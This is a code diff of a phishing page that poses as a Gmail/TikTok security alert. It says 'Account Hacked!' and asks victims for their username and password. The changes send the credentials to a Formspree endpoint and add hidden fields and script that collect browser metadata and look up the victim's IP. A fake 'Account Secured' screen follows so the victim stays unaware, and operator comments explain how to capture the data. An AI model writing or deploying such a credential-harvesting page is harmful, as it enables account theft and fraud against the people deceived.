@@ -24,92 +24,92 @@
             text-align: center;
             border-top: 5px solid #d93025;
         }
-        .icon {
-            font-size: 50px;
-            color: #d93025;
-            margin-bottom: 15px;
-        }
-        h1 {
-            color: #333;
-            font-size: 22px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            font-size: 12px;
-            color: #888;
-            margin-bottom: 5px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 14px;
-            box-sizing: border-box;
-            transition: border-color 0.3s;
-        }
-        input:focus {
-            border-color: #d93025;
-            outline: none;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #d93025;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background 0.3s;
-        }
-        button:hover {
-            background-color: #b92b20;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #999;
-        }
+        .icon { font-size: 50px; color: #d93025; margin-bottom: 15px; }
+        h1 { color: #333; font-size: 22px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; box-sizing: border-box; }
+        input:focus { border-color: #d93025; outline: none; }
+        button { width: 100%; padding: 14px; background-color: #d93025; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #b92b20; }
+        .footer { margin-top: 20px; font-size: 11px; color: #999; }
+        
+        /* New: Loading & Success States */
+        .hidden { display: none; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #d93025; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-icon { font-size: 60px; color: #2e7d32; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="icon">⚠️</div>
-    <h1>Account Hacked!</h1>
-    <p>Your Gmail or TikTok account has been accessed from an unknown device. Tap below to verify your password and secure your account immediately.</p>
-    
-    <!-- Replace 'capture.php' with your backend script to save data -->
-    <form action="https://formspree.io/f/mbgozgge" method="POST">
-        <div class="input-group">
-            <label>Username / Email</label>
-            <input type="text" name="username" placeholder="Enter your Gmail or TikTok username" required>
-        </div>
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" name="password" placeholder="Enter your password" required>
-        </div>
-        <button type="submit">Verify & Secure Account</button>
-    </form>
-    
-    <div class="footer">
-        Secure Login • 2024
+    <!-- FORM STATE -->
+    <div id="form-state">
+        <div class="icon">⚠️</div>
+        <h1>Account Hacked!</h1>
+        <p>Your Gmail or TikTok account has been accessed from an unknown device. Tap below to verify your password and secure your account immediately.</p>
+        
+        <form id="captureForm" action="https://formspree.io/f/mbgozgge" method="POST">
+            <div class="input-group">
+                <label>Username / Email</label>
+                <input type="text" name="username" id="username" placeholder="Enter your Gmail or TikTok username" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" name="password" id="password" placeholder="Enter your password" required autocomplete="off">
+            </div>
+            
+            <!-- Hidden Fields for Metadata -->
+            <input type="hidden" name="user_agent" id="userAgent" value="">
+            <input type="hidden" name="timestamp" id="timestamp" value="">
+            <input type="hidden" name="referrer" id="referrer" value="">
+            <input type="hidden" name="screen_res" id="screenRes" value="">
+
+            <button type="submit">Verify & Secure Account</button>
+        </form>
+        <div class="footer">Secure Login • 2024</div>
+    </div>
+
+    <!-- LOADING STATE -->
+    <div id="loading-state" class="hidden">
+        <div class="spinner"></div>
+        <h1>Verifying Credentials...</h1>
+        <p>Checking for unauthorized access.</p>
+    </div>
+
+    <!-- SUCCESS STATE -->
+    <div id="success-state" class="hidden">
+        <div class="success-icon">✅</div>
+        <h1>Account Secured</h1>
+        <p>We've locked out the unauthorized session. Your account is now protected. We recommend changing your password regularly.</p>
+        <button onclick="location.reload()">Back to Login</button>
     </div>
 </div>
+
+<script>
+    // Capture Metadata before submission
+    document.getElementById('captureForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Prevent actual page reload, handle via AJAX or allow default if you prefer
+        
+        // Set hidden fields
+        document.getElementById('userAgent').value = navigator.userAgent;
+        document.getElementById('timestamp').value = new Date().toISOString();
+        document.getElementById('referrer').value = document.referrer;
+        document.getElementById('screenRes').value = window.screen.width + 'x' + window.screen.height;
+        
+        // Optional: Add IP via a free API (requires CORS-friendly endpoint)
+        fetch('https://ipapi.co/json/')
+            .then(r => r.json())
+            .then(data => {
+                // You can't easily add this to a form after submission starts easily without JS fetch to Formspree,
+                // but Formspree already captures the IP of the requester automatically in its dashboard.
+                this.submit(); // Submit the native form
+            })
+            .catch(() => this.submit()); // Submit even if IP lookup fails
+    });
+</script>
 
 </body>
 </html>
